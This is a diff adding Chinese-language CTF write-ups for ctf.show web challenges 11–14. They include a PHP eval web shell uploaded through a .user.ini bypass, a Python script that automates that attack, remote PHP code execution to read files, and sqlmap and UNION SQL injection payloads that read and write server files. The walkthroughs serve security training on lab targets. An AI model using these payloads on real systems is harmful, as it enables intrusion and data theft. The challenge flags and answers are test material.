@@ -7826,6 +7826,434 @@ username=admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&passw
 
 ------
 
+### web11
+
+进入靶机后看到一个能输入账号和密码的登录框。此外，靶机直接给出的`PHP`代码如下：
+
+```php
+<?php
+    function replaceSpecialChar($strParam){
+         $regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";
+         return preg_replace($regex,"",$strParam);
+    }
+    if(strlen($password)!=strlen(replaceSpecialChar($password))){
+        die("sql inject error");
+    }
+    if($password==$_SESSION['password']){
+        echo $flag;
+    }else{
+        echo "error";
+    }
+?>
+```
+
+当用户输入的的`password`等于`$_SESSION['password']`时输出`flag`。
+
+`session`是一种在服务器中记录用户状态的机制，客户端浏览器访问服务器时，服务器会把客户端信息以某种形式记录在服务器上。当客户端浏览器再次访问时只需要从`session`中查找该用户的状态即可。
+
+用`Burp Suite`抓包后，将`Cookie`中的`PHPSESSID`清空，并且将输入的密码`password`设置为空。
+
+```
+GET /login.php?password= HTTP/1.1
+Host: f1e68946-3ab0-4c0c-a14b-f1623557d536.challenge.ctf.show
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://f1e68946-3ab0-4c0c-a14b-f1623557d536.challenge.ctf.show/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=
+Connection: keep-alive
+```
+
+靶机显示的页面如下：
+
+> 管理员认证结果
+>
+> ctfshow{5a573d0f-9972-4aea-ab57-18412d560a9a}
+
+提交`ctfshow{5a573d0f-9972-4aea-ab57-18412d560a9a}`即可。
+
+------
+
+### web12
+
+靶机的源代码如下：
+
+```html
+<html lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0" />
+    <title>ctf.show_web12</title>
+</head>
+<body>
+    <center>
+    <h2>ctf.show_web12</h2>
+    <h4>where is the flag?</h4>
+    <!-- hit:?cmd= -->
+</body>
+</html>
+```
+
+`/?cmd=phpinfo();`可以看到靶机的`PHP`信息。
+
+`/?cmd=var_dump(scandir('./'));`查看`index.php`所在路径的文件目录。
+
+```php
+array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(68) "903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php" [3]=> string(9) "index.php" }
+```
+
+或者用`/?cmd=print_r(glob('*'));`也可以查看当前文件目录。
+
+```php
+Array ( [0] => 903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php [1] => index.php )
+```
+
+直接`/903c....php`访问是不行的，`var_dump(file_get_contents(''))`的返回值也是NULL。这怎么办？用`highlight_file()`或者`show_source()`可以看到`flag`。
+
+```
+/?cmd=highlight_file('903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php');
+
+/?cmd=show_source('903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php');
+```
+
+靶机的显示内容如下：
+
+```php
+<?php
+$flag="ctfshow{c9481509-db92-44de-82b5-fad0a893ea55}";
+?>
+```
+
+提交`ctfshow{c9481509-db92-44de-82b5-fad0a893ea55}`即可。
+
+------
+
+### web13
+
+靶机的源代码如下：
+
+```html
+<html lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0" />
+    <title>ctf.show_web13</title>
+</head>
+<body>
+    <center>
+    <h2>ctf.show_web13</h2>
+	<h4>where is the flag?</h4>
+	<form action="upload.php" method="post" enctype="multipart/form-data">
+		<input type="file" name="file">
+		<input type="submit" name="上传">		
+	</form>
+	</center>
+</body>
+</html>
+```
+
+`dirsearch -u`扫描靶机发现靶机存在备份文件`/upload.php.bak`，它泄露了`upload.php`的源码。
+
+```php
+<?php 
+    //设置响应的内容类型和字符编码
+    header("content-type:text/html;charset=utf-8");
+    //这些行从全局数组 $_FILES 中获取文件的名称、临时存储位置、大小和上传过程中的错误代码
+    $filename = $_FILES['file']['name'];        
+    $temp_name = $_FILES['file']['tmp_name'];     //获取上传文件信息，
+    $size = $_FILES['file']['size'];            
+    $error = $_FILES['file']['error'];        
+    //使用 pathinfo() 函数获取文件的路径信息，然后从返回的数组中获取文件扩展名
+    $arr = pathinfo($filename);        
+    $ext_suffix = $arr['extension'];
+    //限制文件大小为24字节
+    if ($size > 24){
+        die("error file size"); 
+    }
+    //限制文件名长度为9
+    if (strlen($filename)>9){    
+        die("error file name");    
+    }
+    //文件扩展名限制为3
+    if(strlen($ext_suffix)>3){
+        die("error suffix");
+    }
+    //检查扩展名是否包含php
+    if(preg_match("/php/i",$ext_suffix)){ 
+        die("error suffix");
+    }
+    //检查文件中是否包含php
+    if(preg_match("/php/i",$filename)){
+        die("error file name");                
+    }
+    //使用move_uploaded_file()函数将临时文件移动到指定目录，移动成功则文件上传成功
+    if (move_uploaded_file($temp_name, './'.$filename)){
+        echo "文件上传成功！";
+    }else{
+        echo "文件上传失败！";
+    } 
+ ?>
+```
+
+`.user.ini`文件是一个可选的配置文件，它允许开发者和用户在不修改主 `php.ini` 文件的情况下自定义 `PHP`设置，可以覆盖或添加全局 `php.ini` 文件中的相应设置。其中有两个文件上传相关的参数，分别是`auto_prepend_file`和`auto_append_file`，前者将文件内容包含在每个脚本文件的头部执行，而后者将文件内容包含在每个脚本文件的尾部执行。
+
+先上传`.user.ini`文件，内容为`auto_prepend_file=1.txt`。然后在`1.txt`文件中包含`PHP`一句话木马`<?php eval($_POST['a']);`，这样刚好24个字节，可以绕过`PHP`限制上传成功。
+
+文件上传成功后，用`AntSword`连接靶机的`/upload.php`，如果直接用文件管理打开会提示没有权限，而用虚拟终端打开是能够拿到`flag`的。
+
+```bash
+(*) 基础信息
+当前路径: /var/www/html
+磁盘列表: /
+系统信息: Linux d62fa6be2761 5.4.0-163-generic #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 x86_64
+当前用户: www-data
+(*) 输入 ashelp 查看本地命令
+(www-data:/var/www/html) $ ls
+1.txt
+903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php
+index.php
+upload.php
+upload.php.bak
+(www-data:/var/www/html) $ cat 903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php
+<?php
+$flag="ctfshow{fa687777-aab7-4008-be2e-e8a504ea11b8}";
+?>
+```
+
+如果不赶时间的话，这种简单题可以练习一下爬虫和正则表达式，编写`Python`代码自动化读取`flag`。
+
+```python
+import re
+import requests
+
+url = "http://76a06c69-5453-4512-a555-1eafed1d09c5.challenge.ctf.show"
+upload_url = f"{url}/upload.php"
+
+# 上传 .user.ini
+resp1 = requests.post(upload_url, files={'file': ('.user.ini', b'auto_prepend_file=1.txt')})
+if "文件上传成功！" not in resp1.text:
+    print("[-] .user.ini 上传失败")
+    exit()
+print("[+] .user.ini 上传成功")
+
+# 上传 1.txt
+resp2 = requests.post(upload_url, files={'file': ('1.txt', b"<?php eval($_POST['a']);")})
+if "文件上传成功！" not in resp2.text:
+    print("[-] 1.txt 上传失败")
+    exit()
+print("[+] 1.txt 上传成功")
+
+print("[*] 尝试访问upload.php页面触发.user.ini并查看当前文件目录")
+r = requests.post(f"{url}/upload.php", data={'a': 'print_r(glob("*"));'})
+phpfiles = re.findall(r'\b[A-Za-z0-9]+\.php\b', r.text)
+print("[*] 发现好东西, 尝试读取%s"%phpfiles[0])
+r = requests.post(f"{url}/upload.php", data={'a': f'highlight_file("{phpfiles[0]}");'})
+# print(r.text)
+flag_match = re.search(r'ctfshow\{[0-9a-z\-]+\}', r.text)
+if flag_match:
+    flag = flag_match.group(0)
+    print(f"Flag found!\n{flag}")
+# ctfshow{fa687777-aab7-4008-be2e-e8a504ea11b8}
+```
+
+代码运行非常丝滑，干净利落地拿到`flag`。
+
+```
+[+] .user.ini 上传成功
+[+] 1.txt 上传成功
+[*] 尝试访问upload.php页面触发.user.ini并查看当前文件目录
+[*] 发现好东西, 尝试读取903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php
+Flag found!
+ctfshow{fa687777-aab7-4008-be2e-e8a504ea11b8}
+```
+
+提交`ctfshow{fa687777-aab7-4008-be2e-e8a504ea11b8}`即可。
+
+------
+
+### web14
+
+靶机的代码如下：
+
+```php
+<?php
+include("secret.php");
+
+if(isset($_GET['c'])){
+    $c = intval($_GET['c']);
+    sleep($c);
+    switch ($c) {
+        case 1:
+            echo '$url';
+            break;
+        case 2:
+            echo '@A@';
+            break;
+        case 555555:
+            echo $url;
+        case 44444:
+            echo "@A@";
+            break;
+        case 3333:
+            echo $url;
+            break;
+        case 222:
+            echo '@A@';
+            break;
+        case 222:
+            echo '@A@';
+            break;
+        case 3333:
+            echo $url;
+            break;
+        case 44444:
+            echo '@A@';
+        case 555555:
+            echo $url;
+            break;
+        case 3:
+            echo '@A@';
+        case 6000000:
+            echo "$url";
+        case 1:
+            echo '@A@';
+            break;
+    }
+}
+
+highlight_file(__FILE__);
+```
+
+根据代码开头的`include("secret.php");`访问`include("secret.php");`看到`<!-- ReadMe -->`。
+
+审计`PHP`代码后，发现`case 3:`和代码块缺少了`break`，它会继续执行`case 6000000`输出`$url`变量，直到遇到`case 1:`中的`break`为止。因此，我们直接访问`/?c=3`，靶机在3秒后会出现含有`$url`的内容：`@A@here_1s_your_f1ag.php@A@`。
+
+访问`/here_1s_your_f1ag.php`。点击查询会请求默认值`?query=1`出现一个提示框显示`admin`。
+
+输入`?query=2`，提示框会显示`gtf1y`。而输入`1+1`会请求`?query=1%2B1`，也显示`gtf1y`。这说明存在数字型SQL注入点。直接用`sqlmap`爆破数据库吧，打到`--columns`时，我就有预感`flag`不在数据库。
+
+```bash
+┌──(t0ur1st㉿kali)-[~]
+└─$ sqlmap -u "https://71387ab6-fb11-4315-8d21-32a56bb4c96f.challenge.ctf.show/here_1s_your_f1ag.php?query=1" --tamper=space2comment --batch --dbs 
+[INFO] the back-end DBMS is MySQL
+web application technology: PHP 5.6.40, Nginx 1.20.1
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[INFO] fetching database names
+[INFO] retrieved: 'information_schema'
+[INFO] retrieved: 'mysql'
+[INFO] retrieved: 'performance_schema'
+[INFO] retrieved: 'web'
+available databases [4]:                                                  
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] web
+
+┌──(t0ur1st㉿kali)-[~]
+└─$ sqlmap -u "https://71387ab6-fb11-4315-8d21-32a56bb4c96f.challenge.ctf.show/here_1s_your_f1ag.php?query=1" --tamper=space2comment --batch -D web --tables
+[INFO] fetching tables for database: 'web'
+[WARNING] reflective value(s) found and filtering out
+[WARNING] the SQL query provided does not return any output
+[WARNING] the SQL query provided does not return any output
+[WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+Database: web
+[1 table]
++---------+
+| content |
++---------+
+
+┌──(t0ur1st㉿kali)-[~]
+└─$ sqlmap -u "https://71387ab6-fb11-4315-8d21-32a56bb4c96f.challenge.ctf.show/here_1s_your_f1ag.php?query=1" --tamper=space2comment -D web -T content --columns
+[INFO] fetching columns for table 'content' in database 'web'
+[WARNING] reflective value(s) found and filtering out
+[WARNING] the SQL query provided does not return any output
+[WARNING] the SQL query provided does not return any output
+[WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[WARNING] unable to retrieve column names for table 'content' in database 'web'
+do you want to use common column existence check? [y/N/q] y
+which common columns (wordlist) file do you want to use?
+[1] default '/usr/share/sqlmap/data/txt/common-columns.txt' (press Enter)
+[2] custom
+> 1
+[INFO] checking column existence using items from '/usr/share/sqlmap/data/txt/common-columns.txt'
+[INFO] adding words used on web page to the check list
+please enter number of threads? [Enter for 1 (current)]
+[WARNING] running in a single-thread mode. This could take a while
+[INFO] retrieved: id                                           
+[INFO] retrieved: username                                     
+[INFO] retrieved: password
+Database: web
+Table: web.content
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | numeric     |
+| password | non-numeric |
+| username | non-numeric |
++----------+-------------+
+
+┌──(t0ur1st㉿kali)-[~]
+└─$ sqlmap -u "https://71387ab6-fb11-4315-8d21-32a56bb4c96f.challenge.ctf.show/here_1s_your_f1ag.php?query=1" --tamper=space2comment -D web -T content -C username,password --dump
+[INFO] fetching entries of column(s) 'password,username' for table 'content' in database 'web'
+[WARNING] reflective value(s) found and filtering out
+[INFO] retrieved: 'flag is not here!','admin'
+[INFO] retrieved: 'wow,you can really dance','gtf1y'
+[INFO] retrieved: 'tell you a secret,secret has a secret...',...
+Database: web                                                             
+Table: content
+[3 entries]
++----------+------------------------------------------+
+| username | password                                 |
++----------+------------------------------------------+
+| admin    | flag is not here!                        |
+| gtf1y    | wow,you can really dance                 |
+| Wow      | tell you a secret,secret has a secret... |
++----------+------------------------------------------+
+```
+
+好家伙，被出题老头耍了这是。世上没有白走的路，走过的路都算数好吧。利用`SQL`注入点来读取文件。构建`payload`读取`secret`，`-1 union select load_file('/var/www/html/secret.php')`。
+
+```
+/here_1s_your_f1ag.php?query=-1/**/union/**/select/**/load_file(%27/var/www/html/secret.php%27)
+```
+
+`F12`才能在`JavaScript`代码段中看到刚拿到题时访问`secret.php`没看到的内容。
+
+```html
+<script>alert('<!-- ReadMe -->
+<?php
+$url = 'here_1s_your_f1ag.php';
+$file = '/tmp/gtf1y';
+if(trim(@file_get_contents($file)) === 'ctf.show'){
+	echo file_get_contents('/real_flag_is_here');
+}')</script>
+```
+
+根据代码逻辑，出题人本意是想让我们利用SQL注入漏洞将`ctf.show`写入文件`/tmp/gtf1y`中换`flag`。构建`payload`：`-1 UNION SELECT 'ctf.show' INTO OUTFILE '/tmp/gtf1y'`，空格替换为注释。
+
+```
+/here_1s_your_f1ag.php?query=-1/**/union/**/select/**/%27ctf.show%27/**/INTO/**/OUTFILE/**/%27/tmp/gtf1y%27
+```
+
+将`ctf.show`成功写入`/tmp/gtf1y`后再用浏览器直接访问`/secret.php`就能看到`flag`啦。然而，还有一种年轻人不讲武德的做法——继续使用``-1 union select load_file('/real_flag_is_here')`。
+
+```
+/here_1s_your_f1ag.php?query=-1/**/union/**/select/**/load_file(%27/real_flag_is_here%27)
+```
+
+这样做也可以在`F12`中看到`flag`信息。
+
+```html
+<script>alert('ctfshow{273eca28-414f-4e88-85a6-92d5a5e5a81c}')</script>
+```
+
+提交`ctfshow{273eca28-414f-4e88-85a6-92d5a5e5a81c}`即可。
+
+------
+
 ## [sqli-labs](https://github.com/Audi-1/sqli-labs)
 
 ### Less-1
